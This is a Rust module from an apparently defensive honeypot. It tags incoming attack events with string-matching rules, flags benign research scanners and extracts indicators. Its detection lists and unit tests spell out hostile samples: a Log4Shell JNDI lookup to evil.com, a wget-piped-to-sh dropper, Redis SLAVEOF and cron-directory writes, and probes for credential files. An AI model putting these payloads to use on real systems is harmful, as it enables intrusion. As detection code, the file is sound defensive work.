//! Rule-based attack classification, benign scanner detection, and unified event ingestion

use crate::db::{AttackEvent, WriteSender};
use crate::events::EventBus;
use crate::geoip::GeoIp;
use crate::ioc;

#[derive(Debug, Clone)]
pub struct Classification {
    pub tags: Vec<String>,
    pub is_scanner: bool,
}

/// Classify an attack event using rule-based pattern matching across metadata & payload.
pub fn classify_event(event: &AttackEvent, decoded_payload: Option<&str>) -> Classification {
    let mut tags: Vec<String> = event.tags.clone();
    let mut is_scanner = event.is_scanner;

    let mut add_tag = |tag: &str| {
        if !tags.iter().any(|t| t == tag) {
            tags.push(tag.to_string());
        }
    };

    let req_l = event.request.to_ascii_lowercase();
    let path_l = event
        .http_path
        .as_deref()
        .unwrap_or("")
        .to_ascii_lowercase();
    let ua_l = event
        .user_agent
        .as_deref()
        .unwrap_or("")
        .to_ascii_lowercase();
    let asn_l = event
        .asn_org
        .as_deref()
        .unwrap_or("")
        .to_ascii_lowercase();
    let payload_l = decoded_payload.unwrap_or("").to_ascii_lowercase();
    let service_l = event.service.to_ascii_lowercase();

    let combined = format!("{}\n{}\n{}\n{}", req_l, path_l, ua_l, payload_l);

    // Log4Shell
    if combined.contains("${jndi:") || combined.contains("%24%7bjndi:") {
        add_tag("log4shell");
    }

    // SQL Injection
    if combined.contains("union select")
        || combined.contains("union all select")
        || combined.contains("' or '1'='1")
        || combined.contains("' or 1=1")
        || combined.contains("information_schema")
        || combined.contains("sleep(") && combined.contains("select")
        || ua_l.contains("sqlmap")
    {
        add_tag("sqli");
    }

    // Path traversal / LFI
    if combined.contains("../")
        || combined.contains("..%2f")
        || combined.contains("%2e%2e/")
        || combined.contains("/etc/passwd")
        || combined.contains("/etc/shadow")
    {
        add_tag("path-traversal");
    }

    // Cryptominer indicators
    if combined.contains("xmrig")
        || combined.contains("stratum+tcp")
        || combined.contains("stratum+ssl")
        || combined.contains("minerd")
        || combined.contains("kworkerds")
        || combined.contains("moneroocean")
        || combined.contains("c3pool")
    {
        add_tag("cryptominer");
    }

    // Mirai / IoT dropper indicators
    if combined.contains("busybox")
        || combined.contains("/bin/busybox")
        || combined.contains("mirai")
        || combined.contains("tftp -g")
        || combined.contains("/boaform/admin/formlogin")
        || combined.contains("/hnap1")
        || combined.contains("/goform/")
        || combined.contains("mozi.")
    {
        add_tag("mirai-iot");
    }

    // RCE / Shell dropper patterns
    if combined.contains("eval(")
        || combined.contains("system(")
        || combined.contains("shell_exec")
        || combined.contains("base64 -d")
        || combined.contains("base64 --decode")
        || ((combined.contains("wget ") || combined.contains("curl "))
            && (combined.contains("| sh")
                || combined.contains("|sh")
                || combined.contains("| bash")
                || combined.contains("|bash")
                || combined.contains("chmod +x")
                || combined.contains("chmod 777")))
        || combined.contains("/bin/sh -c")
        || combined.contains("powershell ")
        || combined.contains("invoke-webrequest")
    {
        add_tag("rce");
    }

    // Secrets & sensitive config probes
    if path_l.contains("/.env")
        || path_l.contains("/.git/")
        || path_l.contains("/.aws/")
        || path_l.contains("/actuator/env")
        || path_l.contains("/config.json")
        || path_l.contains("/secrets")
        || path_l.contains("/.ssh/")
    {
        add_tag("secret-probe");
    }

    // WordPress / CMS probes
    if path_l.contains("wp-login")
        || path_l.contains("wp-admin")
        || path_l.contains("wp-content")
        || path_l.contains("xmlrpc.php")
    {
        add_tag("wp-probe");
    }

    // Admin / DB UI probes
    if path_l.contains("phpmyadmin")
        || path_l.starts_with("/pma")
        || path_l.contains("/adminer")
        || path_l.contains("/manager/html")
        || path_l.contains("/solr/admin")
    {
        add_tag("admin-probe");
    }

    // LLM / AI endpoint probes
    if service_l == "ollama"
        || event.port == 11434
        || path_l.starts_with("/api/tags")
        || path_l.starts_with("/api/generate")
        || path_l.starts_with("/api/chat")
        || path_l.starts_with("/v1/models")
        || path_l.starts_with("/v1/chat/completions")
    {
        add_tag("llm-probe");
    }

    // Docker API probes
    if service_l == "docker"
        || event.port == 2375
        || event.port == 2376
        || path_l.contains("/containers/json")
    {
        add_tag("docker-api");
    }

    // Redis RCE patterns
    if service_l == "redis"
        && (payload_l.contains("slaveof")
            || payload_l.contains("replicaof")
            || payload_l.contains("config set")
            || payload_l.contains("eval ")
            || payload_l.contains("module load")
            || payload_l.contains("flushall"))
    {
        add_tag("redis-rce");
    }

    // Open proxy checks
    if req_l.starts_with("connect ") || req_l.starts_with("get http://") || req_l.starts_with("get https://") {
        add_tag("open-proxy");
    }

    // Credential brute-force tags
    if event.username.is_some() {
        match service_l.as_str() {
            "ssh" | "ssh-alt" => add_tag("ssh-bruteforce"),
            "ftp" => add_tag("ftp-bruteforce"),
            "telnet" | "telnet-alt" => add_tag("telnet-bruteforce"),
            "smtp" | "submission" => add_tag("smtp-auth"),
            "mysql" | "mysql-alt" | "postgresql" | "postgresql-alt" => add_tag("db-bruteforce"),
            "redis" => add_tag("redis-auth"),
            _ => {}
        }
    }

    // Known benign internet research scanners
    let scanner_match = [
        ("shodan", "scanner:shodan"),
        ("censys", "scanner:censys"),
        ("binaryedge", "scanner:binaryedge"),
        ("expanse", "scanner:expanse"),
        ("xpanse", "scanner:palo-alto"),
        ("palo alto", "scanner:palo-alto"),
        ("paloaltonetworks", "scanner:palo-alto"),
        ("stretchoid", "scanner:stretchoid"),
        ("internetmeasurement", "scanner:internetmeasurement"),
        ("internet-measurement", "scanner:internetmeasurement"),
        ("shadowserver", "scanner:shadowserver"),
        ("leakix", "scanner:leakix"),
        ("onyphe", "scanner:onyphe"),
        ("rapid7", "scanner:rapid7"),
        ("zoomeye", "scanner:zoomeye"),
        ("bitsight", "scanner:bitsight"),
        ("securityscorecard", "scanner:securityscorecard"),
        ("driftnet", "scanner:driftnet"),
        ("modat", "scanner:modat"),
        ("infrawatch", "scanner:infrawatch"),
        ("uptimerobot", "scanner:uptimerobot"),
    ];

    for (needle, tag) in scanner_match {
        if ua_l.contains(needle) || asn_l.contains(needle) {
            is_scanner = true;
            add_tag(tag);
        }
    }

    Classification { tags, is_scanner }
}

/// Enrich an event (GeoIP City + ASN, attack classification, IOC extraction), queue for DB write,
/// and broadcast to live SSE subscribers.
pub fn record_event(
    mut event: AttackEvent,
    geoip: &GeoIp,
    write_tx: &WriteSender,
    event_bus: &EventBus,
) {
    if event.country_code.is_none() {
        if let Some(loc) = geoip.lookup(&event.ip) {
            event = event.with_geo(loc.country_code, loc.latitude, loc.longitude);
        }
    }

    if event.asn.is_none() {
        if let Some(asn) = geoip.lookup_asn(&event.ip) {
            event.asn = Some(asn.number);
            event.asn_org = Some(asn.organization);
        }
    }

    let decoded_payload = event
        .payload
        .as_deref()
        .and_then(|hex_str| hex::decode(hex_str).ok())
        .map(|bytes| String::from_utf8_lossy(&bytes).into_owned());

    let classification = classify_event(&event, decoded_payload.as_deref());
    event.tags = classification.tags;
    event.is_scanner = classification.is_scanner;

    if event.is_scanner {
        // Known benign scanners & monitors carry documentation URLs, not attacker IOCs.
        event.iocs.clear();
    } else {
        // Extract IOCs aware of protocol context (ignores benign HTTP Referer/UA URLs)
        for item in ioc::extract_iocs_for_event(
            &event.service,
            &event.request,
            event.http_path.as_deref(),
            decoded_payload.as_deref(),
        ) {
            if !event.iocs.iter().any(|existing| existing == &item) {
                event.iocs.push(item);
            }
        }
        event.iocs.truncate(20);
    }

    write_tx.send(event.clone());
    event_bus.publish(event);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classifies_exploits_and_scanners() {
        let mut ev = AttackEvent::new(
            "45.1.2.3".into(),
            "http".into(),
            80,
            "GET /?q=${jndi:ldap://evil.com/a} HTTP/1.1".into(),
        );
        ev.http_path = Some("/.env".into());
        ev.user_agent = Some("Mozilla/5.0 Shodan".into());

        let res = classify_event(&ev, Some("wget http://x.y/z.sh | sh"));
        assert!(res.tags.contains(&"log4shell".to_string()));
        assert!(res.tags.contains(&"secret-probe".to_string()));
        assert!(res.tags.contains(&"rce".to_string()));
        assert!(res.tags.contains(&"scanner:shodan".to_string()));
        assert!(res.is_scanner);
    }

    #[test]
    fn classifies_llm_and_redis_rce() {
        let mut ev = AttackEvent::new("8.8.8.8".into(), "ollama".into(), 11434, "GET /api/tags".into());
        ev.http_path = Some("/api/tags".into());
        let res = classify_event(&ev, None);
        assert!(res.tags.contains(&"llm-probe".to_string()));
        assert!(!res.is_scanner);

        let redis_ev = AttackEvent::new("8.8.8.8".into(), "redis".into(), 6379, "SLAVEOF 1.2.3.4 6379".into());
        let res2 = classify_event(&redis_ev, Some("CONFIG SET dir /var/spool/cron"));
        assert!(res2.tags.contains(&"redis-rce".to_string()));
    }

    #[test]
    fn classifies_extended_scanners_and_skips_iocs() {
        let mut xpanse = AttackEvent::new("1.2.3.4".into(), "http".into(), 80, "GET /".into());
        xpanse.user_agent = Some("Hello from Palo Alto Networks, find out more in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity".into());
        let r1 = classify_event(&xpanse, None);
        assert!(r1.is_scanner);
        assert!(r1.tags.contains(&"scanner:palo-alto".to_string()));

        let mut driftnet = AttackEvent::new("1.2.3.5".into(), "unknown".into(), 8090, "Connection".into());
        driftnet.asn_org = Some("Driftnet Ltd".into());
        let r2 = classify_event(&driftnet, None);
        assert!(r2.is_scanner);
        assert!(r2.tags.contains(&"scanner:driftnet".to_string()));

        let mut uptime = AttackEvent::new("1.2.3.6".into(), "http".into(), 80, "GET /".into());
        uptime.user_agent = Some("Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)".into());
        let r3 = classify_event(&uptime, None);
        assert!(r3.is_scanner);
        assert!(r3.tags.contains(&"scanner:uptimerobot".to_string()));

        let mut infrawatch = AttackEvent::new("1.2.3.7".into(), "http-proxy".into(), 8080, "GET /".into());
        infrawatch.user_agent = Some("Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/)".into());
        let r4 = classify_event(&infrawatch, None);
        assert!(r4.is_scanner);
        assert!(r4.tags.contains(&"scanner:infrawatch".to_string()));

        // Verify record_event clears IOCs for scanners
        let (tx, _rx) = tokio::sync::broadcast::channel(8);
        let bus = EventBus::new(tx);
        let geoip = GeoIp::new("nonexistent.mmdb", "nonexistent_asn.mmdb");
        let (wtx, mut wrx) = tokio::sync::mpsc::channel(8);
        let sender = WriteSender::for_test(wtx);
        let ev = AttackEvent::new("1.2.3.7".into(), "unknown".into(), 8090, "Connection".into())
            .with_payload(b"GET / HTTP/1.1\r\nUser-Agent: Infrawatch/1.0 (+https://infrawat.ch/)\r\n\r\n".to_vec())
            .with_user_agent("Infrawatch/1.0 (+https://infrawat.ch/)".into());
        record_event(ev, &geoip, &sender, &bus);
        let recorded = wrx.try_recv().unwrap();
        assert!(recorded.is_scanner);
        assert!(recorded.iocs.is_empty());
    }
}
